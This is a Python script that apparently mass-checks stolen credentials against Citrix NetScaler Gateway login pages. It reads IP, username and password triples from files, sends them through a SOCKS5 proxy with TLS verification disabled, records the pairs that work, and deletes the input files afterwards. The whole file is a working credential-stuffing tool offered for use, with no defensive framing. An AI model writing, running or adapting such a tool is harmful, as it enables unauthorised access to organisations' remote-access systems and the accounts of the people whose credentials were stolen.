import os
import asyncio
import aiohttp
from aiohttp_socks import ProxyType, ProxyConnector
import aiofiles

async def check_proxy(session, test_url='https://httpbin.org/ip'):
    try:
        async with session.get(test_url, timeout=10) as response:
            if response.status == 200:
                print("[Citrix] Proxy is valid.")
                return True
            else:
                print(f"[Citrix] Proxy returned status {response.status}.")
                return False
    except Exception as e:
        print(f"[Citrix] Proxy check failed: {e}")
        return False

async def valid_wrapper(line, valid_file_path):
    async with aiofiles.open(valid_file_path, 'a') as valid_file:
        await valid_file.write(f'{line}\n')

async def check_host(semaphore, session, ip, data, line, valid_file_path):
    url = f'https://{ip}/p/u/doAuthentication.do'
    async with semaphore:
        try:
            async with session.post(url, data=data, ssl=False, timeout=10) as resp:
                if '<CredentialUpdateService>/p/a/getCredentialUpdateRequirements.do</CredentialUpdateService>' in await resp.text():
                    print(f'[Citrix] {line} is valid')
                    await valid_wrapper(line, valid_file_path)
                else:
                    print(f'[Citrix] {line} is invalid')
        except Exception as e:
            print(f'[Citrix] Error checking {line}: {e}')

async def process_file(semaphore, proxy_info, file_path, valid_file_path):
    host, port, username, password = proxy_info.split(':')
    connector = ProxyConnector(proxy_type=ProxyType.SOCKS5, host=host, port=int(port), username=username, password=password)
    async with aiohttp.ClientSession(connector=connector) as session:
        if not await check_proxy(session):
            print("[Citrix] Skipping file processing due to proxy check failure.")
            return
        with open(file_path, "r") as file:
            lines = file.readlines()
        tasks = [check_host(semaphore, session, line.split(";")[0], {"login": line.split(";")[1], "passwd": line.split(";")[2].strip(), "savecredentials": "false", "nsg-x1-logon-button": "Log On", "StateContext": "bG9naW5zY2hlbWE9ZGVmYXVsdA%3D%3D"}, line, valid_file_path) for line in lines]
        await asyncio.gather(*tasks)
        os.remove(file_path)  # Удаление файла после обработки
        print(f"[Citrix] File {file_path} has been processed and removed.")

async def main():
    with open("config.txt", "r") as config_file:
        for line in config_file:
            if line.startswith("threads"):
                threads = int(line.split("=")[1].strip())
                break
    print(f"[Citrix] Using {threads} threads.")  # Вывод количества потоков

    filedirk = "/root/NAM/Check"
    validdir = "/root/NAM/Servis"

    semaphore = asyncio.Semaphore(threads)  # Ограничение количества одновременных задач
    os.makedirs(filedirk, exist_ok=True)
    os.makedirs(validdir, exist_ok=True)
    valid_file_path = os.path.join(validdir, 'valid.txt')
    proxy_config_path = os.path.join(validdir, 'proxy_config.txt')
    
    with open(proxy_config_path, "r") as proxy_file:
        proxy_info = proxy_file.readline().strip()

    files = [os.path.join(filedirk, f) for f in os.listdir(filedirk) if f.endswith(".txt")]
    for file_path in files:
        await process_file(semaphore, proxy_info, file_path, valid_file_path)

if __name__ == "__main__":
    asyncio.run(main())
